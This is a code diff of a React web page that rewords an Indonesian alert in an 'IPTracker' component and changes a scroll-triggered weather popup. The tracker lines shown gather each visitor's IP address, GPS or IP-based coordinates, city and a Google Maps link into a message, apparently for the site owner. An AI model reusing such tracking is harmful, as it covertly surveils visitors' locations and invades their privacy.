@@ -112,7 +112,7 @@ function IPTracker() {
         if (visitorData.using_gps) {
           
           message = `
-NUZ! Ada pengunjung nihhh...
+NUZ! Ada yang dateng nihhh...
 - IP: ${visitorData.ip}
 - Koordinat GPS: ${visitorData.latitude}, ${visitorData.longitude}
 - Peta: https://www.google.com/maps?q=${visitorData.latitude},${visitorData.longitude}
@@ -121,7 +121,7 @@ NUZ! Ada pengunjung nihhh...
 `;      
         } else {
           message = `
-NUZ! Ada pengunjung nihhh...
+NUZ! Ada yang dateng nihhh...
 - IP: ${visitorData.ip}
 - Lokasi: ${visitorData.city}, ${visitorData.country}
 - Koordinat IP: ${visitorData.latitude}, ${visitorData.longitude}
@@ -156,6 +156,7 @@ const WeatherNotification = () => {
   const [showWeather, setShowWeather] = useState(false)
   const [weather, setWeather] = useState<any>(null)
   const [loading, setLoading] = useState(true)
+  const [scrollTriggered, setScrollTriggered] = useState(false)
 
   
   useEffect(() => {
@@ -176,18 +177,41 @@ const WeatherNotification = () => {
     fetchWeather()
   }, [])
 
+  
   useEffect(() => {
+    if (scrollTriggered) return 
+
     const handleScroll = () => {
-      if (window.scrollY > 300 && !showWeather) {
+      if (window.scrollY > 300 && !showWeather && !scrollTriggered) {
         setShowWeather(true)
+        setScrollTriggered(true)
         
-        setTimeout(() => setShowWeather(false), 5000)
+        
+        const timer = setTimeout(() => {
+          setShowWeather(false)
+        }, 3000)
+
+        return () => clearTimeout(timer)
       }
     }
 
-    window.addEventListener('scroll', handleScroll)
-    return () => window.removeEventListener('scroll', handleScroll)
-  }, [showWeather])
+    
+    const debouncedScroll = debounce(handleScroll, 100)
+    window.addEventListener('scroll', debouncedScroll)
+    
+    return () => {
+      window.removeEventListener('scroll', debouncedScroll)
+    }
+  }, [showWeather, scrollTriggered])
+
+  
+  function debounce(func: () => void, timeout = 300) {
+    let timer: NodeJS.Timeout
+    return () => {
+      clearTimeout(timer)
+      timer = setTimeout(() => { func() }, timeout)
+    }
+  }
 
   if (loading || !weather) return null
 
